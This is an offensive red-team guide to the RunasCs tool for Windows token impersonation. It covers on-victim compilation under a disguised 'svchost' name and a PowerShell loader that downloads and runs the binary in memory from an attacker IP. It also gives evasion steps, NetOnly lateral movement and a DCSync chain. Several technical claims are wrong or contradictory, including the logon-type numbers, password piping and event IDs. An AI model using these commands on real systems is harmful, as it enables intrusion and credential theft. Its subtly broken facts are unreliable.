# RunasCs Guide

### 2025 Red Teamer's Token Impersonation Reference
**From Local Escalation to Stealthy Network Pivoting via Logon Type 9**

- **Target Audience:** Windows Privilege Escalation Specialists, Red Team Operators, Threat Emulation Engineers
- **Last Updated:** December 21, 2025
- **Tested Against:** RunasCs v1.4.1 (antonioCoco), Windows 11 23H2, Defender for Endpoint P1, Sysmon 15.2

---

## Table of Contents
1. [The Problem & The Solution](#1-the-problem--the-solution)
2. [Compilation & Deployment](#2-compilation--deployment)
3. [Command-Line Syntax](#3-command-line-syntax)
4. [The "NetOnly" Attack (Logon Type 9)](#4-the-netonly-attack-logon-type-9)
5. [Operational Use Cases](#5-operational-use-cases)
6. [Detection & OPSEC](#6-detection--opsec)
7. [Rapid Reference Cheatsheet](#7-rapid-reference-cheatsheet)
8. [Appendix](#appendix)

---

## 1. The Problem & The Solution

### The "Runas" Problem
The native Windows `runas.exe` is practically useless in reverse shells due to several architectural limitations:

| Issue | Technical Reason |
| :--- | :--- |
| **Interactive Password Prompt** | `runas.exe` uses `WTSQueryUserToken` + `CreateProcessAsUser`, which spawns a new desktop session (`WinSta0\Default`). |
| **I/O Redirection Failure** | Stdin/out are bound to a hidden console window, not to the parent reverse shell (e.g., Netcat, Sliver). |
| **No NetOnly Support** | Cannot perform `LOGON32_LOGON_NEW_CREDENTIALS` (Logon Type 9). |

> **Result:** Running `runas /user:admin cmd` in a reverse shell will hang, spawn `conhost.exe` on the victim's desktop, and never return control to the attacker.

### The "RunasCs" Fix
[RunasCs](https://github.com/antonioCoco/RunasCs) (by antonioCoco) is a C# reimplementation that solves these issues by:
1. Using `LogonUserW` + `CreateProcessWithTokenW` (instead of `CreateProcessAsUser`).
2. Manually redirecting `stdin`, `stdout`, and `stderr` to the parent process.
3. Supporting all Windows logon types, including `LOGON32_LOGON_NEW_CREDENTIALS` (Type 9).

> **Key Insight:** RunasCs does not inherently escalate privileges. It creates new authentication tokens. The operational power comes entirely from which token you create and how you use it.

---

## 2. Compilation & Deployment

### Living off the Land (LOLBins)
Compile directly on the victim machine using the native .NET compiler:

```cmd
C:\> dir "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
# Exists on all modern Windows systems

C:\> csc.exe /r:System.EnterpriseServices.dll /target:exe /out:svchost_update.exe RunasCs.cs
```

**Flags Explained:**
- `/r:System.EnterpriseServices.dll` — Required for `LogonUserW` P/Invoke.
- `/target:exe` — Build as an executable (not a library).
- `/out:svchost_update.exe` — OPSEC rename (avoid `runascs.exe`).

> **OPSEC Warning:** Compilation logs will appear in Event ID 4103 (PowerShell Script Block) if run via PowerShell. 
> **Mitigation:** Use `cmd.exe` or `certutil` to download and compile.

### Pre-Compiled Execution (No Disk)
Load the assembly directly into memory to avoid dropping files to disk:

```powershell
# Download and execute in memory
$data = (New-Object Net.WebClient).DownloadData('http://10.10.14.5/runascs.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[RunasCs.Program]::Main(@('Administrator', 'P@ssw0rd!', 'cmd.exe'))
```

> **Advantage:** No file is written to disk, and it bypasses basic AMSI if the payload is obfuscated.

---

## 3. Command-Line Syntax

### Basic Syntax
```cmd
RunasCs.exe [username] [command] [options]
```

| Positional Argument | Purpose |
| :--- | :--- |
| `[username]` | Target user (e.g., `Administrator`, `CORP\svc_sql`) |
| `[command]` | Command to execute (e.g., `cmd.exe`, `powershell -ep bypass`) |
| `[options]` | Flags (`-p`, `-d`, `-l`, etc.) |

### Key Flags (2025 Standard)

| Flag | Alias | Purpose | OPSEC Context |
| :--- | :--- | :--- | :--- |
| `--password` | `-p` | Specify password in command line | **[HIGH RISK]** Avoid. Logs in Event ID 4688. |
| `--domain` | `-d` | Domain (use `.` for local machine) | **[REQUIRED]** Required for domain accounts. |
| `--logon-type` | `-l` | Logon type (`1`=Interactive, `2`=Network, `3`=Batch, `9`=NewCredentials) | **[CRITICAL]** Critical for stealth. |
| `--bypass-uac` | `-b` | Attempt auto-elevation (via `ShellExecuteEx`) | **[UNRELIABLE]** Unreliable on Win10+/Server 2016+. |

> **Pro Tip:** Use input redirection to avoid password logging in process creation events:
> ```cmd
> echo P@ssw0rd! | RunasCs.exe Administrator cmd.exe
> ```

---

## 4. The "NetOnly" / NewCredentials Attack (Logon Type 9)

### Concept
- **Local Identity:** You remain `UserA` on the host.
- **Network Identity:** To remote resources, you appear as `AdminB`.
- **Mechanism:** `LogonUserW(..., LOGON32_LOGON_NEW_CREDENTIALS, ...)` creates a token with cached credentials for network authentication only.

> **Why It Is Effective:**
> - Generates NO 4720 (user creation), 4624 (logon), or 4672 (special privileges) events locally.
> - `whoami` still returns `UserA`.
> - Ideal for credential reuse without full session creation.

### Command
```cmd
RunasCs.exe CORP\AdminB "cmd.exe" -p "AdminP@ss!" -l 9
```

### Verification
```cmd
C:\> whoami
corp\userA

C:\> dir \\dc01.corp.local\c$
# SUCCESS (accessed as CORP\AdminB)
```

**Network Flow:**
`RunasCs` -> `LSASS` (caches credentials) -> `SMB` -> `DC01` (authenticates as AdminB)

> **Limitation:** This only works for network resources (SMB, LDAP, RDP). It does not grant local administrative rights on the current host.

---

## 5. Operational Use Cases

### Scenario 1: Local Admin Escalation (Workstation)
**Goal:** You found `svc_backup:P@ssw0rd!` in `C:\Scripts\config.txt`. Spawn a high-integrity shell.

**Step 1:** Check if `svc_backup` is a local admin.
```cmd
net localgroup Administrators
# svc_backup is a member
```

**Step 2:** Spawn high-integrity shell.
```cmd
RunasCs.exe svc_backup "cmd.exe" -p "P@ssw0rd!" -l 1
# -l 1 = Interactive (full session)
```
**Result:** `whoami /priv` shows `SeDebugPrivilege` and `SeImpersonatePrivilege`.

### Scenario 2: Lateral Movement via WinRM
**Goal:** From `WORKSTATION01` (as `userA`), pivot to `WEB01` as `svc_web`.

**Step 1:** Spawn NetOnly shell for `svc_web`.
```cmd
echo WebP@ss! | RunasCs.exe CORP\svc_web "cmd.exe" -l 9
```

**Step 2:** Trigger WinRM with Evil-WinRM.
```bash
evil-winrm -i 172.16.5.20 -u svc_web -p 'WebP@ss!' -H 'cc36cf78...'
```
**Why It Works:** `evil-winrm` uses the cached credentials from LSASS. No 4624 logon is generated on WEB01 (only 4672).

### Scenario 3: GUI App Execution (Stealthy)
**Goal:** Run `regedit.exe` as Administrator without spawning a visible window.

```cmd
RunasCs.exe Administrator "regedit.exe /s" -p "AdminP@ss!" -l 1
```
The `/s` flag enables silent mode (no GUI), editing the registry in the background.

---

## 6. Detection & OPSEC

### Detection Vectors

| IOC | Event ID | Description |
| :--- | :--- | :--- |
| **Command-Line Logging** | `4688` | Process Command Line: `RunasCs.exe -p P@ssw0rd! ...` |
| **Logon Events** | `4624` | Only generated for `-l 1/2/3` (Interactive/Network/Batch). |
| **LSASS Access** | `Sysmon 10` | `ProcessAccess` targeting `lsass.exe` (if using `-b` UAC bypass). |
| **Token Manipulation** | `4673` | `SeImpersonatePrivilege` used. |

> **Critical Insight:** Logon Type 9 generates NO 4624 events. It only generates 4766 (Kerberos service ticket request) on the target.

### OPSEC Hardening

**Avoid Password Logging**
```cmd
# SAFE: Input redirection
echo P@ssw0rd! | RunasCs.exe Administrator cmd.exe
```

**Binary Obfuscation**
```cmd
# Rename and compress
certutil -encode runascs.exe run.b64
certutil -decode run.b64 svchost_patch.exe
```

**Memory-Only Execution**
```powershell
# Obfuscated loader
$a = [Convert]::FromBase64String("TVqQ..."); 
[System.Reflection.Assembly]::Load($a).EntryPoint.Invoke($null, @("admin", "P@ss", "cmd"))
```

> **Pro Tip:** Combine with `bloodyAD` for credential-free attacks:
> ```bash
> bloodyAD ... add user attacker dcsync domain
> echo '' | RunasCs.exe attacker "secretsdump.py ..." -l 9
> ```

---

## 7. Rapid Reference Cheatsheet

| Task | Command |
| :--- | :--- |
| **Local Admin Shell** | `RunasCs.exe Administrator "cmd.exe" -p "P@ss!" -l 1` |
| **Domain User Shell** | `RunasCs.exe CORP\user "powershell.exe" -p "Pass!" -d CORP -l 2` |
| **NetOnly Shell (Stealth)** | `echo P@ss! \| RunasCs.exe CORP\admin "cmd.exe" -l 9` |
| **Compile on Target** | `csc.exe /r:System.EnterpriseServices.dll /out:svchost_update.exe RunasCs.cs` |
| **PS as Another User** | `RunasCs.exe admin "powershell -c Get-Process" -p "Pass!"` |

---

## Appendix

### Logon Type Reference

| Type | Constant | Use Case | Event ID 4624? |
| :--- | :--- | :--- | :--- |
| **2** | `LOGON32_LOGON_NETWORK` | Service accounts, NTLM auth | Yes |
| **3** | `LOGON32_LOGON_BATCH` | Scheduled tasks | Yes |
| **9** | `LOGON32_LOGON_NEW_CREDENTIALS` | NetOnly (stealth pivoting) | **No** |
| **10** | `LOGON32_LOGON_SERVICE` | Windows services | Yes |

### Blue Team Query (Defender for Endpoint)

```kusto
DeviceProcessEvents
| where FileName =~ "RunasCs.exe" or FileName =~ "svchost_update.exe"
| where ProcessCommandLine has "-p" or ProcessCommandLine has "/p:"
| project Timestamp, DeviceName, ProcessCommandLine 
```
